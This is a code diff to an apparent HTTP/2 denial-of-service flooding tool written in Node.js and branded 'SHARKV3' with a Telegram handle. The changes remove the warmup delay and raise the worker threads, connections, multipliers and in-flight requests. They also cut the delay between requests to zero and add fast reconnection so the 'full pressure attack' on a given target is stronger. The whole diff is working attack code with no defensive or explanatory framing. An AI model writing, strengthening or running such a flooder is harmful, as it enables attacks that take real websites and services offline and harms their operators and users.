@@ -1,14 +1,14 @@
 const http2 = require('http2');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 16;
-const INITIAL_CONNECTIONS = 25;
-const POWER_MULTIPLIER = 3;
-const WARMUP_TIME = 10000;
-const MAX_INFLIGHT = 2000;
+const THREADS = 32; // increased
+const INITIAL_CONNECTIONS = 50; // increased
+const POWER_MULTIPLIER = 5; // more power
+const MAX_INFLIGHT = 4000; // increased
+const LIVE_REFRESH_RATE = 1500;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -26,29 +26,24 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
 
     console.clear();
-    console.log(`Warming up... Starting attack in 10s`);
+    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+    console.log(`Starting full pressure attack...`);
 
-    setTimeout(() => {
-        console.clear();
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
+    // No warmup delay — start full force instantly
+    for (let i = 0; i < THREADS; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: true } });
+    }
 
-        for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: true } });
-        }
+    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: false } });
+    }
 
-        setTimeout(() => {
-            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-                new Worker(__filename, { workerData: { target, duration, initial: false } });
-            }
-        }, WARMUP_TIME);
-
-        setInterval(() => {
-            maxRps = Math.max(maxRps, rpsLastSecond);
-            renderStats();
-            rpsLastSecond = 0;
-        }, 1000);
-    }, WARMUP_TIME);
+    // Live Stats
+    setInterval(() => {
+        maxRps = Math.max(maxRps, rpsLastSecond);
+        renderStats();
+        rpsLastSecond = 0;
+    }, LIVE_REFRESH_RATE);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
@@ -87,7 +82,6 @@ if (isMainThread) {
                 inflight.count++;
                 const req = client.request({ ':method': 'GET', ':path': '/' });
 
-                req.setNoDelay?.(true);
                 req.on('response', () => {
                     inflight.count--;
                     sendStat('ok');
@@ -100,13 +94,13 @@ if (isMainThread) {
 
                 req.end();
                 sendStat('req');
-            } catch (e) {
+            } catch {
                 inflight.count--;
                 sendStat('err');
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 1);
+        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
     }
 
     function createConnection() {
@@ -119,24 +113,18 @@ if (isMainThread) {
             const inflight = { count: 0 };
 
             client.on('error', () => {
-                inflight.count = 0;
                 client.destroy();
+                setTimeout(createConnection, 100); // auto-recover fast
             });
 
-            client.on('goaway', () => {
-                client.close();
-            });
-
-            client.on('close', () => {
-                inflight.count = 0;
-                setTimeout(createConnection, 100); // reconnect
-            });
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, 100));
 
             client.on('connect', () => {
-                for (let i = 0; i < 100; i++) sendLoop(client, inflight);
+                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
-            setTimeout(createConnection, 250);
+            setTimeout(createConnection, 100);
         }
     }
 
